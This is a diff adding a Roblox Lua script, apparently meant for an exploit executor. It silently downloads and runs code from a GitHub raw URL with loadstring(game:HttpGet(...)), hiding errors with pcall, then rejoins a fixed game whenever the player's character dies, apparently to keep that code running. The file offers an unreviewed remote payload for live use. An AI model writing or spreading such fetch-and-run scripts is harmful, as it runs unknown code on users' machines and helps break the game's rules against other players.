@@ -1,0 +1,42 @@
+local loadstringURL = "https://raw.githubusercontent.com/HeadHarse/Things/refs/heads/main/Hem"
+local gameID = 116495829188952
+
+-- Run the loadstring
+pcall(function()
+    loadstring(game:HttpGet(loadstringURL))()
+end)
+
+-- Function to handle rejoin
+local function rejoinGame()
+    local TeleportService = game:GetService("TeleportService")
+    local Players = game:GetService("Players")
+    local player = Players.LocalPlayer
+    TeleportService:Teleport(gameID, player)
+end
+
+-- Monitor health
+local function monitorHealth()
+    local Players = game:GetService("Players")
+    local player = Players.LocalPlayer
+
+    if not player.Character then
+        player.CharacterAdded:Wait()
+    end
+
+    local function setupChar(char)
+        local humanoid = char:WaitForChild("Humanoid", 5)
+        if humanoid then
+            humanoid.Died:Connect(rejoinGame)
+            humanoid:GetPropertyChangedSignal("Health"):Connect(function()
+                if humanoid.Health <= 0 then
+                    rejoinGame()
+                end
+            end)
+        end
+    end
+
+    setupChar(player.Character)
+    player.CharacterAdded:Connect(setupChar)
+end
+
+monitorHealth()
